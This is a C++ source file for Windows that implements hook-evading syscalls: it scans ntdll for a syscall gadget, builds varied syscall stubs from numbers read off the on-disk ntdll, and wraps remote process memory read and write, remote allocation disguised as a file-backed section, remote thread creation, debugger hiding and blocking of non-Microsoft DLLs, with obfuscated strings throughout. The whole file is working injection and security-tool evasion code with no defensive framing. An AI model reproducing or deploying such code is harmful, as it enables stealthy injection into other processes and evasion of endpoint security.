#include "syscalls.h"
#include "stealth_strings.h"

static uint8_t* g_stub_page = nullptr;
static int g_stub_offset = 0;
static uint8_t* g_syscall_gadget = nullptr;
static constexpr int STUB_SIZE = 32;
static constexpr ULONG ViewUnmap = 2;

void find_syscall_gadget() {
    HMODULE ntdll = GetModuleHandleA(XS("ntdll.dll").c_str());
    if (!ntdll) { LOG( "ntdll not loaded\n"); exit(1); }
    uint8_t* base = (uint8_t*)ntdll;
    uint32_t pe_off = *(uint32_t*)(base + 0x3C);
    uint16_t num_sec = *(uint16_t*)(base + pe_off + 6);
    uint16_t opt_sz = *(uint16_t*)(base + pe_off + 20);
    uint32_t sec_off = pe_off + 24 + opt_sz;
    for (uint16_t i = 0; i < num_sec; i++) {
        uint8_t* sec = base + sec_off + i * 40;
        if (memcmp(sec, ".text", 5) != 0) continue;
        uint32_t vsize = *(uint32_t*)(sec + 8);
        uint32_t rva = *(uint32_t*)(sec + 12);
        uint8_t* text = base + rva;
        for (uint32_t j = 0; j + 2 < vsize; j++) {
            if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3) {
                g_syscall_gadget = text + j;
                LOG( "  Syscall gadget at %p\n", (void*)g_syscall_gadget);
                return;
            }
        }
    }
    LOG( "Cannot find syscall;ret gadget in ntdll\n"); exit(1);
}

static SyscallStub make_stub(uint32_t num) {
    if (!g_stub_page) {
        g_stub_page = (uint8_t*)VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!g_stub_page) { LOG( "VirtualAlloc stub page failed\n"); exit(1); }
    }
    uint8_t* p = g_stub_page + g_stub_offset;
    int idx = g_stub_offset / STUB_SIZE;
    int off = 0;

    switch (idx % 4) {
    case 0:
        p[off++]=0x4C; p[off++]=0x8B; p[off++]=0xD1;
        p[off++]=0xB8; *(uint32_t*)(p+off)=num; off+=4;
        break;
    case 1:
        p[off++]=0xB8; *(uint32_t*)(p+off)=num; off+=4;
        p[off++]=0x4C; p[off++]=0x8B; p[off++]=0xD1;
        break;
    case 2:
        p[off++]=0x51; p[off++]=0x41; p[off++]=0x5A;
        p[off++]=0xB8; *(uint32_t*)(p+off)=num; off+=4;
        break;
    case 3:
        p[off++]=0x4C; p[off++]=0x8B; p[off++]=0xD1;
        p[off++]=0x31; p[off++]=0xC0;
        p[off++]=0x05; *(uint32_t*)(p+off)=num; off+=4;
        break;
    }

    p[off++] = 0xFF; p[off++] = 0x25; *(uint32_t*)(p+off) = 0; off += 4;
    *(uint64_t*)(p+off) = (uint64_t)g_syscall_gadget; off += 8;

    g_stub_offset += STUB_SIZE;
    return {num, p};
}

void lock_stubs() {
    if (g_stub_page) {
        ULONG old;
        VirtualProtect(g_stub_page, 4096, PAGE_EXECUTE_READ, &old);
    }
}

static uint32_t find_syscall_number(const uint8_t* data, size_t size, const char* func_name) {
    uint32_t pe_off = *(uint32_t*)(data + 0x3C);
    uint16_t num_sec = *(uint16_t*)(data + pe_off + 6);
    uint16_t opt_sz  = *(uint16_t*)(data + pe_off + 20);
    uint32_t opt_off = pe_off + 24;
    uint32_t sec_off = opt_off + opt_sz;
    uint16_t magic   = *(uint16_t*)(data + opt_off);
    uint32_t exp_rva = *(uint32_t*)(data + opt_off + (magic == 0x20b ? 112 : 96));

    auto rva2off = [&](uint32_t rva) -> uint32_t {
        for (uint16_t i = 0; i < num_sec; i++) {
            uint32_t s = sec_off + i * 40;
            uint32_t va = *(uint32_t*)(data + s + 12);
            uint32_t vs = *(uint32_t*)(data + s + 8);
            uint32_t raw = *(uint32_t*)(data + s + 20);
            if (rva >= va && rva < va + vs) return rva - va + raw;
        }
        return 0;
    };

    uint32_t e = rva2off(exp_rva);
    uint32_t nn = *(uint32_t*)(data + e + 24);
    uint32_t at = rva2off(*(uint32_t*)(data + e + 28));
    uint32_t nt = rva2off(*(uint32_t*)(data + e + 32));
    uint32_t ot = rva2off(*(uint32_t*)(data + e + 36));

    for (uint32_t i = 0; i < nn; i++) {
        uint32_t nr = *(uint32_t*)(data + nt + i * 4);
        uint32_t no = rva2off(nr);
        if (strcmp((const char*)(data + no), func_name) == 0) {
            uint16_t ord = *(uint16_t*)(data + ot + i * 2);
            uint32_t fr  = *(uint32_t*)(data + at + ord * 4);
            uint32_t fo  = rva2off(fr);
            const uint8_t* fn = data + fo;

            for (int j = 0; j < 28; j++) {
                if (fn[j] == 0xB8 && fn[j+3] == 0x00 && fn[j+4] == 0x00) {
                    uint32_t num = *(uint32_t*)(fn + j + 1);
                    if (num < 0x10000) {
                        return num;
                    }
                }
            }

            LOG( "  %s found but prologue unrecognized: ", func_name);
            for (int j = 0; j < 16; j++) LOG( "%02X ", fn[j]);
            LOG( "\n");
        }
    }
    LOG( "Syscall not found: %s\n", func_name); exit(1);
    return 0;
}

SyscallTable g_sys;

SyscallTable resolve_syscalls() {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, XS("\\ntdll.dll").c_str());
    FILE* f = fopen(path, "rb");
    if (!f) { LOG( "Cannot open ntdll\n"); exit(1); }
    fseek(f, 0, SEEK_END); size_t sz = ftell(f); fseek(f, 0, SEEK_SET);
    std::vector<uint8_t> d(sz);
    fread(d.data(), 1, sz, f); fclose(f);

    SyscallTable t;
    t.NtQuerySystemInformation = make_stub(find_syscall_number(d.data(), sz, XS("NtQuerySystemInformation").c_str()));
    t.NtOpenProcess            = make_stub(find_syscall_number(d.data(), sz, XS("NtOpenProcess").c_str()));
    t.NtDuplicateObject        = make_stub(find_syscall_number(d.data(), sz, XS("NtDuplicateObject").c_str()));
    t.NtReadVirtualMemory      = make_stub(find_syscall_number(d.data(), sz, XS("NtReadVirtualMemory").c_str()));
    t.NtWriteVirtualMemory     = make_stub(find_syscall_number(d.data(), sz, XS("NtWriteVirtualMemory").c_str()));
    t.NtAllocateVirtualMemory  = make_stub(find_syscall_number(d.data(), sz, XS("NtAllocateVirtualMemory").c_str()));
    t.NtFreeVirtualMemory      = make_stub(find_syscall_number(d.data(), sz, XS("NtFreeVirtualMemory").c_str()));
    t.NtProtectVirtualMemory   = make_stub(find_syscall_number(d.data(), sz, XS("NtProtectVirtualMemory").c_str()));
    t.NtCreateThreadEx         = make_stub(find_syscall_number(d.data(), sz, XS("NtCreateThreadEx").c_str()));
    t.NtClose                  = make_stub(find_syscall_number(d.data(), sz, XS("NtClose").c_str()));
    t.NtSetInformationThread  = make_stub(find_syscall_number(d.data(), sz, XS("NtSetInformationThread").c_str()));
    t.NtCreateSection          = make_stub(find_syscall_number(d.data(), sz, XS("NtCreateSection").c_str()));
    t.NtMapViewOfSection       = make_stub(find_syscall_number(d.data(), sz, XS("NtMapViewOfSection").c_str()));

    LOG( "Syscalls resolved: ... CreateSection=%u MapViewOfSection=%u\n",
        t.NtCreateSection.number, t.NtMapViewOfSection.number);
    return t;
}

HANDLE sys_open(DWORD pid, ULONG access) {
    HANDLE h = nullptr;
    OBJECT_ATTRIBUTES oa{}; oa.Length = sizeof(oa);
    CLIENT_ID cid{}; cid.UniqueProcess = (void*)(uintptr_t)pid;
    auto s = ((fn_NtOpenProcess)g_sys.NtOpenProcess.code)(&h, access, &oa, &cid);
    return (s == 0) ? h : nullptr;
}

bool sys_read(HANDLE h, uint64_t addr, void* buf, size_t sz) {
    return ((fn_NtReadVirtualMemory)g_sys.NtReadVirtualMemory.code)(h, (void*)addr, buf, sz, nullptr) == 0;
}

bool sys_write(HANDLE h, uint64_t addr, const void* buf, size_t sz) {
    return ((fn_NtWriteVirtualMemory)g_sys.NtWriteVirtualMemory.code)(h, (void*)addr, (void*)buf, sz, nullptr) == 0;
}

void sys_close(HANDLE h) {
    ((fn_NtClose)g_sys.NtClose.code)(h);
}

bool sys_protect(HANDLE h, uint64_t addr, size_t sz, ULONG new_prot, ULONG* old_prot) {
    void* base = (void*)addr;
    SIZE_T region = sz;
    return ((fn_NtProtectVirtualMemory)g_sys.NtProtectVirtualMemory.code)(
        h, &base, &region, new_prot, old_prot) == 0;
}

bool sys_free(HANDLE h, uint64_t addr) {
    void* base = (void*)addr;
    SIZE_T region = 0;
    return ((fn_NtFreeVirtualMemory)g_sys.NtFreeVirtualMemory.code)(
        h, &base, &region, 0x8000 /* MEM_RELEASE */) == 0;
}

uint64_t sys_alloc_remote(HANDLE h, size_t size, ULONG prot) {
    void* base = nullptr;
    SIZE_T region = size;
    NTSTATUS st = ((fn_NtAllocateVirtualMemory)g_sys.NtAllocateVirtualMemory.code)(
        h, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, prot);
    if (st != 0 || !base) return 0;
    return (uint64_t)(uintptr_t)base;
}

uint64_t sys_alloc_remote_backed(HANDLE h, size_t size, const wchar_t* backing_file) {
    HANDLE hFile = CreateFileW(backing_file, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("  section alloc: CreateFileW failed (err=%lu)\n", GetLastError());
        return 0;
    }

    HANDLE hSection = nullptr;
    OBJECT_ATTRIBUTES oa{}; oa.Length = sizeof(oa);
    LARGE_INTEGER maxSize; maxSize.QuadPart = (LONGLONG)size;
    NTSTATUS st = ((fn_NtCreateSection)g_sys.NtCreateSection.code)(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        &oa, &maxSize, PAGE_READWRITE, SEC_COMMIT, hFile);
    CloseHandle(hFile);

    if (st != 0 || !hSection) {
        LOG("  section alloc: NtCreateSection failed (st=0x%08lX)\n", (unsigned long)st);
        return 0;
    }

    void* base = nullptr;
    SIZE_T viewSize = size;
    st = ((fn_NtMapViewOfSection)g_sys.NtMapViewOfSection.code)(
        hSection, h, &base, 0, size, nullptr, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
    CloseHandle(hSection);

    if (st != 0 || !base) {
        LOG("  section alloc: NtMapViewOfSection failed (st=0x%08lX)\n", (unsigned long)st);
        return 0;
    }

    LOG("  section alloc: mapped at 0x%llx size=%zu backed by file\n",
        (unsigned long long)(uintptr_t)base, size);
    return (uint64_t)(uintptr_t)base;
}

HANDLE sys_create_thread(HANDLE process, LPTHREAD_START_ROUTINE start, PVOID param) {
    HANDLE thread = nullptr;
    NTSTATUS st = ((fn_NtCreateThreadEx)g_sys.NtCreateThreadEx.code)(
        &thread, THREAD_ALL_ACCESS, nullptr, process, start, param, 0, 0, 0, 0, nullptr);
    if (st != 0) return nullptr;
    return thread;
}

bool enable_mitigation_policy() {
    typedef BOOL(WINAPI* SetProcessMitigationPolicy_t)(ULONG, PVOID, SIZE_T);
    wchar_t k32[32];
    build_kernel32(k32, 32);
    HMODULE h = GetModuleHandleW(k32);
    SecureZeroMemory(k32, sizeof(k32));
    if (!h) { LOG("kernel32 not found\n"); return false; }
    auto pSetPolicy = (SetProcessMitigationPolicy_t)GetProcAddress(h, "SetProcessMitigationPolicy");
    if (!pSetPolicy) { LOG("SetProcessMitigationPolicy not available\n"); return false; }
    struct { union { ULONG Flags; struct { ULONG MicrosoftSignedOnly : 1; ULONG StoreSignedOnly : 1; ULONG MitigationOptIn : 1; ULONG Reserved : 29; }; }; } sp = {};
    sp.MicrosoftSignedOnly = 1;
    if (!pSetPolicy(8, &sp, sizeof(sp))) {
        LOG("ProcessSignaturePolicy failed: %lu\n", GetLastError());
        return false;
    }
    LOG("ProcessSignaturePolicy: MicrosoftSignedOnly enabled\n");
    return true;
}

void sys_hide_thread() {
    ((fn_NtSetInformationThread)g_sys.NtSetInformationThread.code)(
        GetCurrentThread(), 0x11, nullptr, 0);
}